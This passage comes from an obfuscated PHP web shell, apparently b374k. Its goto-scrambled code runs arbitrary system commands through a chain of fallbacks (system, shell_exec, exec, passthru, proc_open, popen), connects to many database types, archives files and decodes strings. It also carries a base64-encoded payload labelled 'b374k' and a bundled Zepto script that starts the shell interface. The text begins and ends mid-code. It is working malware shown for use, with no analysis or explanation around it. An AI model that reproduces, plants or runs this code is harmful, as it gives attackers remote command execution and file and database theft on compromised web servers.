HYtlI; OTCQT: if (!empty($output)) { return $output; } goto gNDV0; WHQUM: @system($code); goto esT9X; HYtlI: ob_start(); goto WHQUM; esT9X: $output = ob_get_contents(); goto JHLQf; JHLQf: ob_end_clean(); goto OTCQT; gNDV0: } elseif (is_callable('shell_exec') && function_exists('shell_exec')) { $output = @shell_exec($code); if (!empty($output)) { return $output; } } elseif (is_callable('exec') && function_exists('exec')) { goto OnmeW; xcoKw: if (!empty($res)) { foreach ($res as $line) { $output .= $line; } } goto voqpG; voqpG: if (!empty($output)) { return $output; } goto P0zy2; OnmeW: @exec($code, $res); goto xcoKw; P0zy2: } elseif (is_callable('passthru') && function_exists('passthru')) { goto vuz7K; LbGpW: if (!empty($output)) { return $output; } goto rac9m; nVp38: $output = ob_get_contents(); goto DDwFr; vuz7K: ob_start(); goto Yn_jC; DDwFr: ob_end_clean(); goto LbGpW; Yn_jC: @passthru($code); goto nVp38; rac9m: } elseif (is_callable('proc_open') && function_exists('proc_open')) { goto Qjktt; Qjktt: $desc = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); goto l0pkr; oXA2l: if (is_resource($proc)) { while ($res = fgets($pipes[1])) { if (!empty($res)) { $output .= $res; } } while ($res = fgets($pipes[2])) { if (!empty($res)) { $output .= $res; } } } goto adWJ3; l0pkr: $proc = @proc_open($code, $desc, $pipes, getcwd(), array()); goto oXA2l; adWJ3: @proc_close($proc); goto Jc1I9; Jc1I9: if (!empty($output)) { return $output; } goto fFHFe; fFHFe: } elseif (is_callable('popen') && function_exists('popen')) { goto C6sTb; D4ktl: if ($res) { while (!feof($res)) { $output .= fread($res, 2096); } pclose($res); } goto Uyjxn; Uyjxn: if (!empty($output)) { return $output; } goto jU7Ts; C6sTb: $res = @popen($code, 'r'); goto D4ktl; jU7Ts: } goto Cq8yG; izfHk: $code = $code . " 2>&1"; goto u2cRx; V99Lq: $output = ""; goto izfHk; OKb17: } } goto F6HEG; jqWkr: error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); goto Toz63; itthL: $explorer_content = ""; goto zAQAl; O9zMJ: @set_time_limit(0); goto yIB3K; mvDI2: if (!function_exists('sql_get_supported')) { function sql_get_supported() { goto UYGgm; bVCef: if (function_exists("odbc_connect")) { $db_supported[] = 'odbc'; } goto KOIzV; H6HZy: return implode(",", $db_supported); goto AC2sn; bJ7qG: if (function_exists("mssql_connect") || function_exists("sqlsrv_connect")) { $db_supported[] = 'mssql'; } goto ZF_fv; ZF_fv: if (function_exists("pg_connect")) { $db_supported[] = 'pgsql'; } goto CwfxS; lAJwp: if (class_exists("SQLite3")) { $db_supported[] = 'sqlite3'; } goto bVCef; KOIzV: if (class_exists("PDO")) { $db_supported[] = 'pdo'; } goto H6HZy; UYGgm: $db_supported = array(); goto ijLrR; ACTou: if (function_exists("sqlite_open")) { $db_supported[] = 'sqlite'; } goto lAJwp; ijLrR: if (function_exists("mysql_connect")) { $db_supported[] = 'mysql'; } goto bJ7qG; CwfxS: if (function_exists("oci_connect")) { $db_supported[] = 'oracle'; } goto ACTou; AC2sn: } } goto obRR7; daKDH: @ob_end_clean(); goto mFg9b; mx4tc: $GLOBALS['module']['database']['js_ontabselected'] = ""; goto Uzav2; mOY4A: if (!function_exists('zip')) { function zip($files, $archive) { goto a3suF; hWUPo: if (!extension_loaded('zip')) { return $status; } goto apT0f; a3suF: $status = false; goto hWUPo; Ut22D: return $status; goto jKOXc; apT0f: if (class_exists("ZipArchive")) { goto sPWxF; TRpTS: $zip->close(); goto Q8wGs; C2vbO: if (!$zip->open($archive, 1)) { return $status; } goto QxUtj; QxUtj: if (!is_array($files)) { $files = array($files); } goto TjgzD; TjgzD: foreach ($files as $file) { goto G26Ck; RM4EI: if (is_dir($file)) { $filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1); foreach ($filesIterator as $iterator) { goto OArSD; RaWYA: if (is_dir($iterator)) { $zip->addEmptyDir(str_replace($file . '/', '', $iterator . '/')); } else { if (is_file($iterator)) { $zip->addFromString(str_replace($file . '/', '', $iterator), read_file($iterator)); } } goto gnGFP; OArSD: $iterator = str_replace('\\', '/', $iterator); goto WOB8J; WOB8J: if (in_array(substr($iterator, strrpos($iterator, '/') + 1), array('.', '..'))) { continue; } goto RaWYA; gnGFP: } } elseif (is_file($file)) { $zip->addFromString(basename($file), read_file($file)); } goto IXfWt; G26Ck: $file = str_replace(get_cwd(), '', $file); goto PiPYO; PiPYO: $file = str_replace('\\', '/', $file); goto RM4EI; IXfWt: } goto QpyXv; QpyXv: if ($zip->getStatusString() !== false) { $status = true; } goto TRpTS; sPWxF: $zip = new ZipArchive(); goto C2vbO; Q8wGs: } goto Ut22D; jKOXc: } } goto nGEeP; nOj8Y: if (!function_exists('sql_field_name')) { function sql_field_name($sqltype, $result, $i) { if ($sqltype == 'mysql') { if (class_exists('mysqli_result')) { $z = $result->fetch_field(); return $z->name; } elseif (function_exists('mysql_field_name')) { return mysql_field_name($result, $i); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_field_metadata')) { goto Lk2YO; KVsU_: if (is_array($metadata)) { $metadata = $metadata[$i]; } goto yLBHD; Lk2YO: $metadata = sqlsrv_field_metadata($result); goto KVsU_; yLBHD: if (is_array($metadata)) { return $metadata['Name']; } goto e3AbO; e3AbO: } elseif (function_exists('mssql_field_name')) { return mssql_field_name($result, $i); } } elseif ($sqltype == 'pgsql') { return pg_field_name($result, $i); } elseif ($sqltype == 'oracle') { return oci_field_name($result, $i + 1); } elseif ($sqltype == 'sqlite3') { return $result->columnName($i); } elseif ($sqltype == 'sqlite') { return sqlite_field_name($result, $i); } elseif ($sqltype == 'odbc') { return odbc_field_name($result, $i + 1); } elseif ($sqltype == 'pdo') { $res = $result->getColumnMeta($i); return $res['name']; } } } goto FH892; uSwBd: ?>'><?php  goto f6Sxi; Lq3xC: if (!function_exists('decode_line')) { function decode_line($type, $result, $inputtype) { goto GwASx; iEW7R: return $res; goto yTbAg; GwASx: $res = "<tr><td class='colFit'>" . $type . "</td><td>"; goto zx335; zx335: if ($inputtype == 'input') { $res .= "<input type='text' value='" . html_safe($result) . "' ondblclick='this.select();'>"; } else { $res .= "<textarea style='height:80px;min-height:80px;' ondblclick='this.select();'>" . html_safe($result) . "</textarea>"; } goto iEW7R; yTbAg: } } goto QhL8Q; lrIPB: $winbinary = strtolower(substr(php_uname(), 0, 3)) == "win" ? "<option>executable</option>" : ""; goto Mt1Yu; LqOAf: foreach ($GLOBALS['module_to_load'] as $k) { echo "function " . $GLOBALS['module'][$k]['id'] . "(){ " . $GLOBALS['module'][$k]['js_ontabselected'] . " }\n"; } goto e1irl; vTVHe: $error = @ob_get_contents(); goto JKgwR; nGEeP: if (!function_exists('compress')) { function compress($type, $archive, $files) { goto wGVfx; HgG92: return false; goto dbX12; G8AdT: if ($type == 'zip') { if (zip($files, $archive)) { return true; } else { return false; } } elseif ($type == 'tar' || $type == 'targz') { goto YkBdt; ogem0: if (is_file($archive)) { return true; } else { return false; } goto Vjtgx; x2n0c: if ($type == 'tar') { execute("tar cf \"" . $archive . "\" " . implode(" ", $lists)); } elseif ($type == 'targz') { execute("tar czf \"" . $archive . "\" " . implode(" ", $lists)); } goto ogem0; YkBdt: $archive = basename($archive); goto SLrhm; SLrhm: $listsBasename = array_map("basename", $files); goto JdS02; JdS02: $lists = array_map("wrap_with_quotes", $listsBasename); goto x2n0c; Vjtgx: } goto HgG92; wGVfx: if (!is_array($files)) { $files = array($files); } goto G8AdT; dbX12: } } goto rtnGA; ST7e8: if (!function_exists('decode')) { function decode($str) { goto PaBBz; odquo: $res .= decode_line("base64 decode", base64_decode($str), "textarea"); goto RoHb9; WXU_Z: $length = (int) strlen($str); goto I6S8w; bxVtY: $res .= decode_line("htmlentities", html_safe($str), "textarea"); goto BP3P3; HOroJ: $res .= decode_line("base64 encode", base64_encode($str), "textarea"); goto odquo; JPHsZ: for ($i = 0; $i < $length; $i++) { $ascii .= ord(substr($str, $i, 1)) . " "; } goto x2uev; BP3P3: if (function_exists('hash_algos')) { $algos = hash_algos(); foreach ($algos as $algo) { if ($algo == 'md5' || $algo == 'sha1') { continue; } $res .= decode_line($algo, hash($algo, $str), "input"); } } goto WRMIv; iVNEw: $res .= decode_line("sha1", sha1($str), "input"); goto HOroJ; zPVcB: $res .= decode_line("urldecode", urldecode($str), "textarea"); goto A2Z4X; I6Uv5: $ascii = ""; goto JPHsZ; PaBBz: $res = ""; goto WXU_Z; I6S8w: $res .= decode_line("md5", md5($str), "input"); goto iVNEw; x2uev: $res .= decode_line("ascii char", trim($ascii), "textarea"); goto gNcHa; O1PsU: $res .= decode_line("rawurldecode", rawurldecode($str), "textarea"); goto bxVtY; gFarW: $res .= decode_line("lowercase", strtolower($str), "textarea"); goto ZQ4au; RoHb9: $res .= decode_line("hex to string", @pack("H*", $str), "textarea"); goto eGJe2; DZ_49: $res .= decode_line("urlencode", urlencode($str), "textarea"); goto zPVcB; WRMIv: return $res; goto m6xEN; gNcHa: $res .= decode_line("reversed", strrev($str), "textarea"); goto gFarW; A2Z4X: $res .= decode_line("rawurlencode", rawurlencode($str), "textarea"); goto O1PsU; ZQ4au: $res .= decode_line("uppercase", strtoupper($str), "textarea"); goto DZ_49; eGJe2: $res .= decode_line("string to hex", bin2hex($str), "textarea"); goto I6Uv5; m6xEN: } } goto Lq3xC; s1KPS: ?>
	</div>
	<!--content end-->

</div>
<!--wrapper end-->
<div id='navigation'>
	<div id='totop'></div>
	<div id='tobottom'></div>
</div>
<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
<form action='<?php  goto pd6S2; SkmcN: $GLOBALS['resources']['b374k'] = "hVXZrrM4En6gjARhC8yoL9hXQ9gDd2xhJ5yw8/Tj/Oef7tPSSG3JwjZVXy1flZ0nc/Lvuk/KAhmH8j9pMhUU8a864CxnQ3W5fLFwmK5fiX4JV9xny9o8G32+Txphqs9CfjhSqDheisVojklHbHNcLDN17HJaGkpDHGhdFDpklnXd/aNwaGMgVWgoXoHVm2vqktW3PEmkD/Z7CBtSKFwVYXOX81wdh/mYNmh9uy2IWnNjLKB1cAYmEK+bjQWvxK+orA+8oiX9CB/f0dm1akNfVGEnrKGaM/na5bJYFvJ1SgdAFVAf+rRGvU999mkYoJFL16pSUlBmy+WJUVupTTGtU6XK9HlOSHG4FvwFHNcGCOKuChFmNCJqehEG3K0EDbuDmt4+06zR3RReV7N5HebBlir/ezZEeVe0Nm5G1xGjP/3Jeqe/u9orV5zNquk1x3PcGLLT6JkjPujd8lrSONnDONXDeED9+noWIYlGj3KG+s0PXDF+mE3WdzCGbk1r7ojliIpCbc0fNqPW6l85gHH+tAnPlt85WSKMmQ28qjKe3o2GXWHOiTTcl+wcIUec6XlonSgOmgmv1cBI6Od3roxffDJE9GBX4BKbgV1n4/jLZoY7bhxGjNpXaK6wlHEwS3b8yX+TYuhayNJmnOICeOYMlG6LXcaFMUH/teZTS3ENIE+QU2EUIOdVLjNHIDNrCjm1v/0vfbla4fmZyMymiqZn1uwrwLoF2sGzo/3WF6+m1XYL9KlKe7NzfZifT63w5JiENgVaRzIhx0CwCSCUB/AkCaCS4Ag5Z6LgtDx2N89Ysv3oBx60jwdzDLn5gdf+Hc//R7x7zdIffjwfpRw5OJJH3MVifMD8lL9zSCUheeayBLkKNAfG/pE3+g72xutwRB81m2gDTblZgroD3z9t3xRNVMTtE5CwfnGzDTgH1sP/8GBumjy8dung/MBz/o53/iPe+vHdwP9PLX5qlGd+1aPfOvK33He//eo/D/4XGCKTpSbBAlSVg+XT51mtIveF8kPtc+/oh+s7XKA0yVMyc1czK0m5FcizEtp3j9Uobo/VtFeRWwLVL9WirnUKcXlW93Szk17izDlPcX1EFbigsg1m4Bu3L7f8clGbN3VPcKlMC+WaGsjbLV5xpLikFwYn4nK/PwUux5s7Te7nMFjWuTxPwuXfN+fWDrpVEkUS5Ex458opjhDcjLNQQz05SfRiic/yxJYClJJ0GalwMFCLbU6gX550e9lKYn/sJnMVyGGiXy3NOwrpYvKrdGmF09vrvuSXhePUbezJ83DWELlMCqstgB6mN1DFTqlRJFHYXuoQS8VC57CK9a0j0aZJLwEtMql9hnM1CqajXPlsJmLrdJKyeyDCFF28zPzy/BwbK7F5Xa06LEld9yvNS5eEenjezdVXtzNGOeQowW+W0C5CpCdqTQ2rFy2snHfB5tLaxnjaATL3yDQw3ntK3pgFvqi3FeCPK7MNmeabrjgNujuF9XNHOT3yyrwS9lo0uWcT88uuFc0DDYnnO67Z2Iz9YA/06Nlnx6J76pWMd30jVPZGJDyv1qD4ioVxDtUloC8V2z4sSC9TJIZ5vFfrmY+EPCJSo3cjcFMDdBGWV3zCZ+Lga+VMThJhf7Wtqk8CO8uPgbFdr+pAL/ElXfq9aIzto2QY6WVupahhDceF44u7I/TE31hQI2KEiKvhc7bGjxbwGOxaCTKptWrZ3XMauYmqNLoVb4PhzUbTO0RLQ3T8zTOfK3wjk+6V52G/Lhhp7t65JjIFRMMJHjrilgb9VGKGbSbA6/4pfXGV29gx2755aq2/juOiGvnu325kquDsPUi7EG/wO6zHjEhlVTHv8G4hcjaT8nnqPPRmhdlaOYGmrsFcoggzVNpbBl9f4TlK6bWQoqUOnnnK8plsdesZ7WhmFVsSuPOx1BHp45oUpElV7XhhE/TYvfFXKszKl7t7TkzpzJO8l6zI9ki1soLaypb96wl3/cBydJKPVPWP/wI="; goto tMtJi; vln6B: ?>;
var init_shell = true;
/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||"object"}function H(a){return G(a)=="function"}function I(a){return a!=null&&a==a.window}function J(a){return a!=null&&a.nodeType==a.DOCUMENT_NODE}function K(a){return G(a)=="object"}function L(a){return K(a)&&!I(a)&&Object.getPrototypeOf(a)==Object.prototype}function M(a){return a instanceof Array}function N(a){return typeof a.length=="number"}function O(a){return g.call(a,function(a){return a!=null})}function P(a){return a.length>0?c.fn.concat.apply([],a):a}function Q(a){return a.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function R(a){return a in j?j[a]:j[a]=new RegExp("(^|\\s)"+a+"(\\s|$)")}function S(a,b){return typeof b=="number"&&!k[Q(a)]?b+"px":b}function T(a){var b,c;return i[a]||(b=h.createElement(a),h.body.appendChild(b),c=getComputedStyle(b,"").getPropertyValue("display"),b.parentNode.removeChild(b),c=="none"&&(c="block"),i[a]=c),i[a]}function U(a){return"children"in a?f.call(a.children):c.map(a.childNodes,function(a){if(a.nodeType==1)return a})}function V(c,d,e){for(b in d)e&&(L(d[b])||M(d[b]))?(L(d[b])&&!L(c[b])&&(c[b]={}),M(d[b])&&!M(c[b])&&(c[b]=[]),V(c[b],d[b],e)):d[b]!==a&&(c[b]=d[b])}function W(a,b){return b==null?c(a):c(a).filter(b)}function X(a,b,c,d){return H(b)?b.call(a,c,d):b}function Y(a,b,c){c==null?a.removeAttribute(b):a.setAttribute(b,c)}function Z(b,c){var d=b.className,e=d&&d.baseVal!==a;if(c===a)return e?d.baseVal:d;e?d.baseVal=c:b.className=c}function $(a){var b;try{return a?a=="true"||(a=="false"?!1:a=="null"?null:!/^0/.test(a)&&!isNaN(b=Number(a))?b:/^[\[\{]/.test(a)?c.parseJSON(a):a):a}catch(d){return a}}function _(a,b){b(a);for(var c in a.childNodes)_(a.childNodes[c],b)}var a,b,c,d,e=[],f=e.slice,g=e.filter,h=window.document,i={},j={},k={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},l=/^\s*<(\w+|!)[^>]*>/,m=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,n=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,o=/^(?:body|html)$/i,p=/([A-Z])/g,q=["val","css","html","text","data","width","height","offset"],r=["after","prepend","before","append"],s=h.createElement("table"),t=h.createElement("tr"),u={tr:h.createElement("tbody"),tbody:s,thead:s,tfoot:s,td:t,th:t,"*":h.createElement("div")},v=/complete|loaded|interactive/,w=/^\.([\w-]+)$/,x=/^#([\w-]*)$/,y=/^[\w-]*$/,z={},A=z.toString,B={},C,D,E=h.createElement("div"),F={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"};return B.matches=function(a,b){if(!b||!a||a.nodeType!==1)return!1;var c=a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.matchesSelector;if(c)return c.call(a,b);var d,e=a.parentNode,f=!e;return f&&(e=E).appendChild(a),d=~B.qsa(e,b).indexOf(a),f&&E.removeChild(a),d},C=function(a){return a.replace(/-+(.)?/g,function(a,b){return b?b.toUpperCase():""})},D=function(a){return g.call(a,function(b,c){return a.indexOf(b)==c})},B.fragment=function(b,d,e){var g,i,j;return m.test(b)&&(g=c(h.createElement(RegExp.$1))),g||(b.replace&&(b=b.replace(n,"<$1></$2>")),d===a&&(d=l.test(b)&&RegExp.$1),d in u||(d="*"),j=u[d],j.innerHTML=""+b,g=c.each(f.call(j.childNodes),function(){j.removeChild(this)})),L(e)&&(i=c(g),c.each(e,function(a,b){q.indexOf(a)>-1?i[a](b):i.attr(a,b)})),g},B.Z=function(a,b){return a=a||[],a.__proto__=c.fn,a.selector=b||"",a},B.isZ=function(a){return a instanceof B.Z},B.init=function(b,d){var e;if(!b)return B.Z();if(typeof b=="string"){b=b.trim();if(b[0]=="<"&&l.test(b))e=B.fragment(b,RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}else{if(H(b))return c(h).ready(b);if(B.isZ(b))return b;if(M(b))e=O(b);else if(K(b))e=[b],b=null;else if(l.test(b))e=B.fragment(b.trim(),RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}return B.Z(e,b)},c=function(a,b){return B.init(a,b)},c.extend=function(a){var b,c=f.call(arguments,1);return typeof a=="boolean"&&(b=a,a=c.shift()),c.forEach(function(c){V(a,c,b)}),a},B.qsa=function(a,b){var c,d=b[0]=="#",e=!d&&b[0]==".",g=d||e?b.slice(1):b,h=y.test(g);return J(a)&&h&&d?(c=a.getElementById(g))?[c]:[]:a.nodeType!==1&&a.nodeType!==9?[]:f.call(h&&!d?e?a.getElementsByClassName(g):a.getElementsByTagName(b):a.querySelectorAll(b))},c.contains=function(a,b){return a!==b&&a.contains(b)},c.type=G,c.isFunction=H,c.isWindow=I,c.isArray=M,c.isPlainObject=L,c.isEmptyObject=function(a){var b;for(b in a)return!1;return!0},c.inArray=function(a,b,c){return e.indexOf.call(b,a,c)},c.camelCase=C,c.trim=function(a){return a==null?"":String.prototype.trim.call(a)},c.uuid=0,c.support={},c.expr={},c.map=function(a,b){var c,d=[],e,f;if(N(a))for(e=0;e<a.length;e++)c=b(a[e],e),c!=null&&d.push(c);else for(f in a)c=b(a[f],f),c!=null&&d.push(c);return P(d)},c.each=function(a,b){var c,d;if(N(a)){for(c=0;c<a.length;c++)if(b.call(a[c],c,a[c])===!1)return a}else for(d in a)if(b.call(a[d],d,a[d])===!1)return a;return a},c.grep=function(a,b){return g.call(a,b)},window.JSON&&(c.parseJSON=JSON.parse),c.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){z["[object "+b+"]"]=b.toLowerCase()}),c.fn={forEach:e.forEach,reduce:e.reduce,push:e.push,sort:e.sort,indexOf:e.indexOf,concat:e.concat,map:function(a){return c(c.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return c(f.apply(this,arguments))},ready:function(a){return v.test(h.readyState)&&h.body?a(c):h.addEventListener("DOMContentLoaded",function(){a(c)},!1),this},get:function(b){return b===a?f.call(this):this[b>=0?b:b+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each(function(){this.parentNode!=null&&this.parentNode.removeChild(this)})},each:function(a){return e.every.call(this,function(b,c){return a.call(b,c,b)!==!1}),this},filter:function(a){return H(a)?this.not(this.not(a)):c(g.call(this,function(b){return B.matches(b,a)}))},add:function(a,b){return c(D(this.concat(c(a,b))))},is:function(a){return this.length>0&&B.matches(this[0],a)},not:function(b){var d=[];if(H(b)&&b.call!==a)this.each(function(a){b.call(this,a)||d.push(this)});else{var e=typeof b=="string"?this.filter(b):N(b)&&H(b.item)?f.call(b):c(b);this.forEach(function(a){e.indexOf(a)<0&&d.push(a)})}return c(d)},has:function(a){return this.filter(function(){return K(a)?c.contains(this,a):c(this).find(a).size()})},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){var a=this[0];return a&&!K(a)?a:c(a)},last:function(){var a=this[this.length-1];return a&&!K(a)?a:c(a)},find:function(a){var b,d=this;return typeof a=="object"?b=c(a).filter(function(){var a=this;return e.some.call(d,function(b){return c.contains(b,a)})}):this.length==1?b=c(B.qsa(this[0],a)):b=this.map(function(){return B.qsa(this,a)}),b},closest:function(a,b){var d=this[0],e=!1;typeof a=="object"&&(e=c(a));while(d&&!(e?e.indexOf(d)>=0:B.matches(d,a)))d=d!==b&&!J(d)&&d.parentNode;return c(d)},parents:function(a){var b=[],d=this;while(d.length>0)d=c.map(d,function(a){if((a=a.parentNode)&&!J(a)&&b.indexOf(a)<0)return b.push(a),a});return W(b,a)},parent:function(a){return W(D(this.pluck("parentNode")),a)},children:function(a){return W(this.map(function(){return U(this)}),a)},contents:function(){return this.map(function(){return f.call(this.childNodes)})},siblings:function(a){return W(this.map(function(a,b){return g.call(U(b.parentNode),function(a){return a!==b})}),a)},empty:function(){return this.each(function(){this.innerHTML=""})},pluck:function(a){return c.map(this,function(b){return b[a]})},show:function(){return this.each(function(){this.style.display=="none"&&(this.style.display=""),getComputedStyle(this,"").getPropertyValue("display")=="none"&&(this.style.display=T(this.nodeName))})},replaceWith:function(a){return this.before(a).remove()},wrap:function(a){var b=H(a);if(this[0]&&!b)var d=c(a).get(0),e=d.parentNode||this.length>1;return this.each(function(f){c(this).wrapAll(b?a.call(this,f):e?d.cloneNode(!0):d)})},wrapAll:function(a){if(this[0]){c(this[0]).before(a=c(a));var b;while((b=a.children()).length)a=b.first();c(a).append(this)}return this},wrapInner:function(a){var b=H(a);return this.each(function(d){var e=c(this),f=e.contents(),g=b?a.call(this,d):a;f.length?f.wrapAll(g):e.append(g)})},unwrap:function(){return this.parent().each(function(){c(this).replaceWith(c(this).children())}),this},clone:function(){return this.map(function(){return this.cloneNode(!0)})},hide:function(){return this.css("display","none")},toggle:function(b){return this.each(function(){var d=c(this);(b===a?d.css("display")=="none":b)?d.show():d.hide()})},prev:function(a){return c(this.pluck("previousElementSibling")).filter(a||"*")},next:function(a){return c(this.pluck("nextElementSibling")).filter(a||"*")},html:function(a){return arguments.length===0?this.length>0?this[0].innerHTML:null:this.each(function(b){var d=this.innerHTML;c(this).empty().append(X(this,a,b,d))})},text:function(b){return arguments.length===0?this.length>0?this[0].textContent:null:this.each(function(){this.textContent=b===a?"":""+b})},attr:function(c,d){var e;return typeof c=="string"&&d===a?this.length==0||this[0].nodeType!==1?a:c=="value"&&this[0].nodeName=="INPUT"?this.val():!(e=this[0].getAttribute(c))&&c in this[0]?this[0][c]:e:this.each(function(a){if(this.nodeType!==1)return;if(K(c))for(b in c)Y(this,b,c[b]);else Y(this,c,X(this,d,a,this.getAttribute(c)))})},removeAttr:function(a){return this.each(function(){this.nodeType===1&&Y(this,a)})},prop:function(b,c){return b=F[b]||b,c===a?this[0]&&this[0][b]:this.each(function(a){this[b]=X(this,c,a,this[b])})},data:function(b,c){var d=this.attr("data-"+b.replace(p,"-$1").toLowerCase(),c);return d!==null?$(d):a},val:function(a){return arguments.length===0?this[0]&&(this[0].multiple?c(this[0]).find("option").filter(function(){return this.selected}).pluck("value"):this[0].value):this.each(function(b){this.value=X(this,a,b,this.value)})},offset:function(a){if(a)return this.each(function(b){var d=c(this),e=X(this,a,b,d.offset()),f=d.offsetParent().offset(),g={top:e.top-f.top,left:e.left-f.left};d.css("position")=="static"&&(g.position="relative"),d.css(g)});if(this.length==0)return null;var b=this[0].getBoundingClientRect();return{left:b.left+window.pageXOffset,top:b.top+window.pageYOffset,width:Math.round(b.width),height:Math.round(b.height)}},css:function(a,d){if(arguments.length<2){var e=this[0],f=getComputedStyle(e,"");if(!e)return;if(typeof a=="string")return e.style[C(a)]||f.getPropertyValue(a);if(M(a)){var g={};return c.each(M(a)?a:[a],function(a,b){g[b]=e.style[C(b)]||f.getPropertyValue(b)}),g}}var h="";if(G(a)=="string")!d&&d!==0?this.each(function(){this.style.removeProperty(Q(a))}):h=Q(a)+":"+S(a,d);else for(b in a)!a[b]&&a[b]!==0?this.each(function(){this.style.removeProperty(Q(b))}):h+=Q(b)+":"+S(b,a[b])+";";return this.each(function(){this.style.cssText+=";"+h})},index:function(a){return a?this.indexOf(c(a)[0]):this.parent().children().indexOf(this[0])},hasClass:function(a){return a?e.some.call(this,function(a){return this.test(Z(a))},R(a)):!1},addClass:function(a){return a?this.each(function(b){d=[];var e=Z(this),f=X(this,a,b,e);f.split(/\s+/g).forEach(function(a){c(this).hasClass(a)||d.push(a)},this),d.length&&Z(this,e+(e?" ":"")+d.join(" "))}):this},removeClass:function(b){return this.each(function(c){if(b===a)return Z(this,"");d=Z(this),X(this,b,c,d).split(/\s+/g).forEach(function(a){d=d.replace(R(a)," ")}),Z(this,d.trim())})},toggleClass:function(b,d){return b?this.each(function(e){var f=c(this),g=X(this,b,e,Z(this));g.split(/\s+/g).forEach(function(b){(d===a?!f.hasClass(b):d)?f.addClass(b):f.removeClass(b)})}):this},scrollTop:function(b){if(!this.length)return;var c="scrollTop"in this[0];return b===a?c?this[0].scrollTop:this[0].pageYOffset:this.each(c?function(){this.scrollTop=b}:function(){this.scrollTo(this.scrollX,b)})},scrollLeft:function(b){if(!this.length)return;var c="scrollLeft"in this[0];return b===a?c?this[0].scrollLeft:this[0].pageXOffset:this.each(c?function(){this.scrollLeft=b}:function(){this.scrollTo(b,this.scrollY)})},position:function(){if(!this.length)return;var a=this[0],b=this.offsetParent(),d=this.offset(),e=o.test(b[0].nodeName)?{top:0,left:0}:b.offset();return d.top-=parseFloat(c(a).css("margin-top"))||0,d.left-=parseFloat(c(a).css("margin-left"))||0,e.top+=parseFloat(c(b[0]).css("border-top-width"))||0,e.left+=parseFloat(c(b[0]).css("border-left-width"))||0,{top:d.top-e.top,left:d.left-e.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||h.body;while(a&&!o.test(a.nodeName)&&c(a).css("position")=="static")a=a.offsetParent;return a})}},c.fn.detach=c.fn.remove,["width","height"].forEach(function(b){var d=b.replace(/./,function(a){return a[0].toUpperCase()});c.fn[b]=function(e){var f,g=this[0];return e===a?I(g)?g["inner"+d]:J(g)?g.documentElement["scroll"+d]:(f=this.offset())&&f[b]:this.each(function(a){g=c(this),g.css(b,X(this,e,a,g[b]()))})}}),r.forEach(function(a,b){var d=b%2;c.fn[a]=function(){var a,e=c.map(arguments,function(b){return a=G(b),a=="object"||a=="array"||b==null?b:B.fragment(b)}),f,g=this.length>1;return e.length<1?this:this.each(function(a,h){f=d?h:h.parentNode,h=b==0?h.nextSibling:b==1?h.firstChild:b==2?h:null,e.forEach(function(a){if(g)a=a.cloneNode(!0);else if(!f)return c(a).remove();_(f.insertBefore(a,h),function(a){a.nodeName!=null&&a.nodeName.toUpperCase()==="SCRIPT"&&(!a.type||a.type==="text/javascript")&&!a.src&&window.eval.call(window,a.innerHTML)})})})},c.fn[d?a+"To":"insert"+(b?"Before":"After")]=function(b){return c(b)[a](this),this}}),B.Z.prototype=c.fn,B.uniq=D,B.deserializeValue=$,c.zepto=B,c}();window.Zepto=Zepto,window.$===undefined&&(window.$=Zepto),function(a){function m(a){return a._zid||(a._zid=c++)}function n(a,b,c,d){b=o(b);if(b.ns)var e=p(b.ns);return(h[m(a)]||[]).filter(function(a){return a&&(!b.e||a.e==b.e)&&(!b.ns||e.test(a.ns))&&(!c||m(a.fn)===m(c))&&(!d||a.sel==d)})}function o(a){var b=(""+a).split(".");return{e:b[0],ns:b.slice(1).sort().join(" ")}}function p(a){return new RegExp("(?:^| )"+a.replace(" "," .* ?")+"(?: |$)")}function q(a,b){return a.del&&!j&&a.e in k||!!b}function r(a){return l[a]||j&&k[a]||a}function s(b,c,e,f,g,i,j){var k=m(b),n=h[k]||(h[k]=[]);c.split(/\s/).forEach(function(c){if(c=="ready")return a(document).ready(e);var h=o(c);h.fn=e,h.sel=g,h.e in l&&(e=function(b){var c=b.relatedTarget;if(!c||c!==this&&!a.contains(this,c))return h.fn.apply(this,arguments)}),h.del=i;var k=i||e;h.proxy=function(a){a=y(a);if(a.isImmediatePropagationStopped())return;a.data=f;var c=k.apply(b,a._args==d?[a]:[a].concat(a._args));return c===!1&&(a.preventDefault(),a.stopPropagation()),c},h.i=n.length,n.push(h),"addEventListener"in b&&b.addEventListener(r(h.e),h.proxy,q(h,j))})}function t(a,b,c,d,e){var f=m(a);(b||"").split(/\s/).forEach(function(b){n(a,b,c,d).forEach(function(b){delete h[f][b.i],"removeEventListener"in a&&a.removeEventListener(r(b.e),b.proxy,q(b,e))})})}function y(b,c){if(c||!b.isDefaultPrevented){c||(c=b),a.each(x,function(a,d){var e=c[a];b[a]=function(){return this[d]=u,e&&e.apply(c,arguments)},b[d]=v});if(c.defaultPrevented!==d?c.defaultPrevented:"returnValue"in 